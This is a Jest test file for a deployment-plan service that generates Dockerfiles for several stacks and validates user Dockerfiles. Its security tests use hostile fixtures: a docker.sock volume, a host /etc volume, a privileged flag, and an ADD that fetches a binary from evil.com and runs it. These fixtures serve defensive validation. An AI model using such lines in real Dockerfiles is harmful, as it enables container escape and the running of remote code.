import { DeploymentPlanService } from './deployment-plan.service';
import {
  RepositoryAnalysisDto,
  ApplicationStructureDto,
  DeploymentReadinessDto,
} from '@cloudpilot/shared';

describe('DeploymentPlanService (Phase 4)', () => {
  let service: DeploymentPlanService;

  beforeEach(() => {
    service = new DeploymentPlanService();
  });

  const baseAnalysis: RepositoryAnalysisDto = {
    id: 'analysis-1',
    projectId: 'proj-1',
    projectType: 'WEB_APPLICATION',
    primaryLanguage: 'TypeScript',
    framework: 'Next.js',
    packageManager: 'npm',
    isMonorepo: false,
    hasDockerfile: false,
    hasDockerCompose: false,
    hasEnvExample: true,
    detectedFiles: ['package.json', 'next.config.ts'],
    analysisVersion: '2.0.0',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };

  const baseStructure: ApplicationStructureDto = {
    primaryRole: 'FULLSTACK',
    confidence: 'HIGH',
    applications: [],
    relationships: [],
    topLevelEntryPoint: { path: 'app/page.tsx', isDefault: true, evidence: 'Next.js page' },
    topLevelBuildCommand: { command: 'npm run build', isDeclared: true, source: 'package.json' },
    topLevelStartCommand: { command: 'npm start', isDeclared: true, source: 'package.json' },
    topLevelPort: { port: 3000, source: '.env.example', confidence: 'HIGH' },
    topLevelOutputDirectory: { path: '.next', isConfigured: false, source: 'Next.js' },
    evidence: ['Next.js framework'],
  };

  const baseReadiness: DeploymentReadinessDto = {
    status: 'READY',
    score: 100,
    strategy: 'NODE_APPLICATION',
    summary: 'Repository is ready for deployment.',
    blockers: [],
    warnings: [],
    requirements: [
      { name: 'PORT', required: true, documented: true, source: '.env.example' },
      { name: 'DATABASE_URL', required: true, documented: true, source: '.env.example' },
    ],
    recommendations: [],
    scoreBreakdown: {
      applicationIdentity: 15,
      buildReadiness: 20,
      runtimeReadiness: 20,
      portReadiness: 15,
      outputArtifactReadiness: 10,
      environmentConfiguration: 10,
      deploymentStrategy: 10,
    },
  };

  // -------------------------------------------------------------------------
  // 1. Plan Generation for Stacks
  // -------------------------------------------------------------------------

  describe('1. Plan Generation for Stacks', () => {
    it('should generate valid deployment plan for Next.js NODE_APPLICATION', () => {
      const plan = service.generatePlan(baseAnalysis, baseStructure, baseReadiness);

      expect(plan.isSupported).toBe(true);
      expect(plan.canDeploy).toBe(true);
      expect(plan.strategy).toBe('NODE_APPLICATION');
      expect(plan.dockerfileStrategy).toBe('GENERATED');
      expect(plan.generatedDockerfile).toContain('FROM node:22-alpine');
      expect(plan.generatedDockerfile).toContain('ENV NEXT_TELEMETRY_DISABLED=1');
      expect(plan.exposedPort).toBe(3000);
      expect(plan.healthCheckStrategy).toBe('HTTP');
      expect(plan.requiredEnvVars).toEqual(['DATABASE_URL', 'PORT']);
    });

    it('should generate valid multi-stage plan for Vite STATIC_FRONTEND', () => {
      const viteAnalysis: RepositoryAnalysisDto = {
        ...baseAnalysis,
        framework: 'Vite',
      };
      const viteStructure: ApplicationStructureDto = {
        ...baseStructure,
        primaryRole: 'FRONTEND',
        topLevelOutputDirectory: { path: 'dist', isConfigured: false, source: 'Vite' },
      };
      const viteReadiness: DeploymentReadinessDto = {
        ...baseReadiness,
        strategy: 'STATIC_FRONTEND',
      };

      const plan = service.generatePlan(viteAnalysis, viteStructure, viteReadiness);

      expect(plan.strategy).toBe('STATIC_FRONTEND');
      expect(plan.exposedPort).toBe(80);
      expect(plan.dockerfileStrategy).toBe('GENERATED');
      expect(plan.generatedDockerfile).toContain('FROM nginx:alpine');
      expect(plan.generatedDockerfile).toContain('/usr/share/nginx/html');
    });

    it('should generate valid plan for Python FastAPI', () => {
      const pyAnalysis: RepositoryAnalysisDto = {
        ...baseAnalysis,
        projectType: 'PYTHON_APPLICATION',
        primaryLanguage: 'Python',
        framework: 'FastAPI',
      };
      const pyStructure: ApplicationStructureDto = {
        ...baseStructure,
        primaryRole: 'API',
        topLevelPort: { port: 8000, source: '.env.example', confidence: 'HIGH' },
      };
      const pyReadiness: DeploymentReadinessDto = {
        ...baseReadiness,
        strategy: 'PYTHON_APPLICATION',
      };

      const plan = service.generatePlan(pyAnalysis, pyStructure, pyReadiness);

      expect(plan.strategy).toBe('PYTHON_APPLICATION');
      expect(plan.exposedPort).toBe(8000);
      expect(plan.generatedDockerfile).toContain('FROM python:3.12-slim');
    });

    it('should generate valid plan for Java Spring Boot', () => {
      const javaAnalysis: RepositoryAnalysisDto = {
        ...baseAnalysis,
        projectType: 'JAVA_APPLICATION',
        primaryLanguage: 'Java',
        framework: 'Spring Boot',
      };
      const javaStructure: ApplicationStructureDto = {
        ...baseStructure,
        primaryRole: 'BACKEND',
        topLevelPort: { port: 8080, source: 'Spring default', confidence: 'MEDIUM' },
      };
      const javaReadiness: DeploymentReadinessDto = {
        ...baseReadiness,
        strategy: 'JAVA_APPLICATION',
      };

      const plan = service.generatePlan(javaAnalysis, javaStructure, javaReadiness);

      expect(plan.strategy).toBe('JAVA_APPLICATION');
      expect(plan.exposedPort).toBe(8080);
      expect(plan.generatedDockerfile).toContain('FROM maven:3.9-eclipse-temurin-21-alpine');
      expect(plan.generatedDockerfile).toContain('FROM eclipse-temurin:21-jre-alpine');
    });

    it('should generate valid plan for Go Application', () => {
      const goAnalysis: RepositoryAnalysisDto = {
        ...baseAnalysis,
        projectType: 'GO_APPLICATION',
        primaryLanguage: 'Go',
        framework: 'Go',
      };
      const goStructure: ApplicationStructureDto = {
        ...baseStructure,
        primaryRole: 'BACKEND',
        topLevelPort: { port: 8080, source: 'Go default', confidence: 'HIGH' },
      };
      const goReadiness: DeploymentReadinessDto = {
        ...baseReadiness,
        strategy: 'GO_APPLICATION',
      };

      const plan = service.generatePlan(goAnalysis, goStructure, goReadiness);

      expect(plan.strategy).toBe('GO_APPLICATION');
      expect(plan.exposedPort).toBe(8080);
      expect(plan.generatedDockerfile).toContain('FROM golang:1.23-alpine');
    });
  });

  // -------------------------------------------------------------------------
  // 2. Dockerfile Security Validation
  // -------------------------------------------------------------------------

  describe('2. Dockerfile Security Validation', () => {
    it('should accept secure user Dockerfile', () => {
      const secureDockerfile = 'FROM node:20-alpine\nWORKDIR /app\nCOPY . .\nEXPOSE 3000\nCMD ["node", "server.js"]';
      const validation = service.validateDockerfile(secureDockerfile);

      expect(validation.isValid).toBe(true);
      expect(validation.blockers).toHaveLength(0);
    });

    it('should reject Dockerfile mounting docker socket', () => {
      const badDockerfile = 'FROM alpine:3.19\nVOLUME /var/run/docker.sock\nCMD ["./run"]';
      const validation = service.validateDockerfile(badDockerfile);

      expect(validation.isValid).toBe(false);
      expect(validation.blockers).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ code: 'FORBIDDEN_DOCKER_SOCKET_VOLUME' }),
        ]),
      );
    });

    it('should reject Dockerfile mounting host filesystem paths', () => {
      const badDockerfile = 'FROM alpine:3.19\nVOLUME /etc\nCMD ["./run"]';
      const validation = service.validateDockerfile(badDockerfile);

      expect(validation.isValid).toBe(false);
      expect(validation.blockers).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ code: 'FORBIDDEN_HOST_PATH_VOLUME' }),
        ]),
      );
    });

    it('should reject Dockerfile attempting privileged flags', () => {
      const badDockerfile = 'FROM alpine:3.19\nRUN echo "--privileged flag test"\nCMD ["./run"]';
      const validation = service.validateDockerfile(badDockerfile);

      expect(validation.isValid).toBe(false);
      expect(validation.blockers).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ code: 'PRIVILEGED_MODE_FORBIDDEN' }),
        ]),
      );
    });

    it('should warn on remote ADD instructions', () => {
      const addDockerfile = 'FROM alpine:3.19\nADD https://evil.com/binary /app/bin\nCMD ["/app/bin"]';
      const validation = service.validateDockerfile(addDockerfile);

      expect(validation.isValid).toBe(true);
      expect(validation.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ code: 'REMOTE_ADD_INSTRUCTION' }),
        ]),
      );
    });
  });

  // -------------------------------------------------------------------------
  // 3. Readiness Blockers & Unsupported Roles
  // -------------------------------------------------------------------------

  describe('3. Readiness Blockers & Unsupported Roles', () => {
    it('should set canDeploy: false when Phase 3.4 readiness is BLOCKED', () => {
      const blockedReadiness: DeploymentReadinessDto = {
        ...baseReadiness,
        status: 'BLOCKED',
        blockers: [
          { code: 'MISSING_START_COMMAND', category: 'RUNTIME', message: 'No start command' },
        ],
      };

      const plan = service.generatePlan(baseAnalysis, baseStructure, blockedReadiness);

      expect(plan.canDeploy).toBe(false);
      expect(plan.isSupported).toBe(false);
      expect(plan.blockers).toHaveLength(1);
    });

    it('should set canDeploy: false when strategy is UNSUPPORTED (Library / CLI)', () => {
      const unsuppReadiness: DeploymentReadinessDto = {
        ...baseReadiness,
        status: 'BLOCKED',
        strategy: 'UNSUPPORTED',
      };

      const plan = service.generatePlan(baseAnalysis, baseStructure, unsuppReadiness);

      expect(plan.canDeploy).toBe(false);
      expect(plan.isSupported).toBe(false);
    });
  });

  // -------------------------------------------------------------------------
  // 4. Monorepo Multi-Application Handling
  // -------------------------------------------------------------------------

  describe('4. Monorepo Multi-Application Handling', () => {
    it('should generate sub-application plans excluding shared libraries', () => {
      const monorepoStructure: ApplicationStructureDto = {
        ...baseStructure,
        applications: [
          {
            name: 'web',
            path: 'apps/web',
            role: 'FRONTEND',
            framework: 'Vite',
            language: 'TypeScript',
            packageManager: 'pnpm',
            entryPoint: { path: 'apps/web/src/main.tsx', isDefault: true, evidence: 'Vite' },
            buildCommand: { command: 'npm run build', isDeclared: true, source: 'package.json' },
            startCommand: { command: 'vite preview', isDeclared: false, source: 'Vite' },
            port: { port: 5173, source: 'Vite', confidence: 'MEDIUM' },
            outputDirectory: { path: 'dist', isConfigured: false, source: 'Vite' },
            confidence: 'HIGH',
            evidence: ['Vite'],
          },
          {
            name: 'api',
            path: 'apps/api',
            role: 'API',
            framework: 'NestJS',
            language: 'TypeScript',
            packageManager: 'pnpm',
            entryPoint: { path: 'apps/api/src/main.ts', isDefault: true, evidence: 'NestJS' },
            buildCommand: { command: 'npm run build', isDeclared: true, source: 'package.json' },
            startCommand: { command: 'npm start', isDeclared: true, source: 'package.json' },
            port: { port: 3000, source: '.env.example', confidence: 'HIGH' },
            outputDirectory: { path: 'dist', isConfigured: false, source: 'NestJS' },
            confidence: 'HIGH',
            evidence: ['NestJS'],
          },
          {
            name: 'shared',
            path: 'packages/shared',
            role: 'LIBRARY',
            framework: null,
            language: 'TypeScript',
            packageManager: 'pnpm',
            entryPoint: null,
            buildCommand: null,
            startCommand: null,
            port: null,
            outputDirectory: null,
            confidence: 'HIGH',
            evidence: ['Library exports'],
          },
        ],
      };

      const monorepoReadiness: DeploymentReadinessDto = {
        ...baseReadiness,
        strategy: 'MULTI_APPLICATION',
      };

      const plan = service.generatePlan(baseAnalysis, monorepoStructure, monorepoReadiness);

      expect(plan.strategy).toBe('MULTI_APPLICATION');
      expect(plan.subApplicationsPlans).toBeDefined();
      expect(plan.subApplicationsPlans).toHaveLength(2); // web & api, shared excluded
      expect(plan.subApplicationsPlans![0].name).toBe('api');
      expect(plan.subApplicationsPlans![1].name).toBe('web');
    });

    it('should generate multi-stage Dockerfile with build output directory for CRA / react-scripts fullstack', () => {
      const craFullstackStructure: ApplicationStructureDto = {
        ...baseStructure,
        primaryRole: 'FULLSTACK',
        topLevelPort: { port: 5173, source: 'Vite default', confidence: 'LOW' },
        applications: [
          {
            name: 'client',
            path: 'client',
            role: 'FRONTEND',
            framework: 'React',
            language: 'JavaScript',
            packageManager: 'npm',
            entryPoint: { path: 'client/src/index.js', isDefault: true, evidence: 'React' },
            buildCommand: { command: 'npm run build', isDeclared: true, source: 'package.json' },
            startCommand: { command: 'npm start', isDeclared: true, source: 'package.json' },
            port: { port: 3000, source: 'React dev default', confidence: 'LOW' },
            outputDirectory: { path: 'build', isConfigured: false, source: 'react-scripts convention' },
            confidence: 'HIGH',
            evidence: ['react-scripts build'],
          },
          {
            name: 'server',
            path: 'server',
            role: 'API',
            framework: 'Express',
            language: 'JavaScript',
            packageManager: 'npm',
            entryPoint: { path: 'server/index.js', isDefault: true, evidence: 'Express' },
            buildCommand: null,
            startCommand: { command: 'npm start', isDeclared: true, source: 'package.json' },
            port: { port: 5000, source: 'Source code (index.js)', confidence: 'HIGH' },
            outputDirectory: null,
            confidence: 'HIGH',
            evidence: ['Express', 'Detected port 5000 from source code (index.js)'],
          },
        ],
      };

      const craReadiness: DeploymentReadinessDto = {
        ...baseReadiness,
        strategy: 'MULTI_APPLICATION',
      };

      const plan = service.generatePlan(baseAnalysis, craFullstackStructure, craReadiness);

      expect(plan.strategy).toBe('MULTI_APPLICATION');
      expect(plan.canDeploy).toBe(true);
      expect(plan.isSupported).toBe(true);
      expect(plan.exposedPort).toBe(5000); // Backend port prioritized over frontend dev port
      expect(plan.generatedDockerfile).toBeDefined();
      expect(plan.generatedDockerfile).toContain('FROM node:22-alpine AS frontend-builder');
      expect(plan.generatedDockerfile).toContain('WORKDIR /app/client');
      expect(plan.generatedDockerfile).toContain('RUN npm run build');
      expect(plan.generatedDockerfile).toContain('FROM node:22-alpine AS runner');
      expect(plan.generatedDockerfile).toContain('ENV PORT=5000');
      expect(plan.generatedDockerfile).toContain('WORKDIR /app/server');
      expect(plan.generatedDockerfile).toContain('COPY --from=frontend-builder /app/client/build ./client/build');
      expect(plan.generatedDockerfile).toContain('EXPOSE 5000');
      expect(plan.generatedDockerfile).toContain('CMD ["npm", "start"]');
    });

    it('should generate multi-stage Dockerfile with dist output directory for Vite fullstack', () => {
      const viteFullstackStructure: ApplicationStructureDto = {
        ...baseStructure,
        primaryRole: 'FULLSTACK',
        topLevelPort: { port: 5173, source: 'Vite', confidence: 'MEDIUM' },
        applications: [
          {
            name: 'client',
            path: 'client',
            role: 'FRONTEND',
            framework: 'Vite',
            language: 'TypeScript',
            packageManager: 'npm',
            entryPoint: { path: 'client/src/main.tsx', isDefault: true, evidence: 'Vite' },
            buildCommand: { command: 'npm run build', isDeclared: true, source: 'package.json' },
            startCommand: { command: 'npm start', isDeclared: true, source: 'package.json' },
            port: { port: 5173, source: 'Vite', confidence: 'MEDIUM' },
            outputDirectory: { path: 'dist', isConfigured: false, source: 'Vite' },
            confidence: 'HIGH',
            evidence: ['Vite'],
          },
          {
            name: 'server',
            path: 'server',
            role: 'API',
            framework: 'Express',
            language: 'JavaScript',
            packageManager: 'npm',
            entryPoint: { path: 'server/src/index.js', isDefault: true, evidence: 'Express' },
            buildCommand: null,
            startCommand: { command: 'npm start', isDeclared: true, source: 'package.json' },
            port: { port: 5000, source: 'Express default', confidence: 'HIGH' },
            outputDirectory: null,
            confidence: 'HIGH',
            evidence: ['Express'],
          },
        ],
      };

      const viteReadiness: DeploymentReadinessDto = {
        ...baseReadiness,
        strategy: 'MULTI_APPLICATION',
      };

      const plan = service.generatePlan(baseAnalysis, viteFullstackStructure, viteReadiness);

      expect(plan.strategy).toBe('MULTI_APPLICATION');
      expect(plan.canDeploy).toBe(true);
      expect(plan.isSupported).toBe(true);
      expect(plan.exposedPort).toBe(5000);
      expect(plan.generatedDockerfile).toBeDefined();
      expect(plan.generatedDockerfile).toContain('COPY --from=frontend-builder /app/client/dist ./client/dist');
      expect(plan.generatedDockerfile).toContain('EXPOSE 5000');
    });

    it('should generate static nginx Dockerfile for pure frontend multi-app', () => {
      const frontendOnlyStructure: ApplicationStructureDto = {
        ...baseStructure,
        primaryRole: 'FRONTEND',
        applications: [
          {
            name: 'web',
            path: 'apps/web',
            role: 'FRONTEND',
            framework: 'React',
            language: 'TypeScript',
            packageManager: 'npm',
            entryPoint: { path: 'apps/web/src/index.tsx', isDefault: true, evidence: 'React' },
            buildCommand: { command: 'npm run build', isDeclared: true, source: 'package.json' },
            startCommand: null,
            port: { port: 3000, source: 'React', confidence: 'MEDIUM' },
            outputDirectory: { path: 'dist', isConfigured: false, source: 'Vite' },
            confidence: 'HIGH',
            evidence: ['React'],
          },
        ],
      };

      const frontendReadiness: DeploymentReadinessDto = {
        ...baseReadiness,
        strategy: 'MULTI_APPLICATION',
      };

      const plan = service.generatePlan(baseAnalysis, frontendOnlyStructure, frontendReadiness);

      expect(plan.strategy).toBe('MULTI_APPLICATION');
      expect(plan.canDeploy).toBe(true);
      expect(plan.exposedPort).toBe(80);
      expect(plan.generatedDockerfile).toContain('FROM nginx:alpine');
      expect(plan.generatedDockerfile).toContain('COPY --from=builder /app/apps/web/dist /usr/share/nginx/html');
    });

    it('should set canDeploy: false if multi-app has no deployable applications', () => {
      const emptyStructure: ApplicationStructureDto = {
        ...baseStructure,
        applications: [],
      };

      const emptyReadiness: DeploymentReadinessDto = {
        ...baseReadiness,
        strategy: 'MULTI_APPLICATION',
      };

      const plan = service.generatePlan(baseAnalysis, emptyStructure, emptyReadiness);

      expect(plan.canDeploy).toBe(false);
      expect(plan.isSupported).toBe(false);
      expect(plan.blockers).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ code: 'UNSUPPORTED_DEPLOYMENT_STRATEGY' }),
        ]),
      );
    });
  });
});
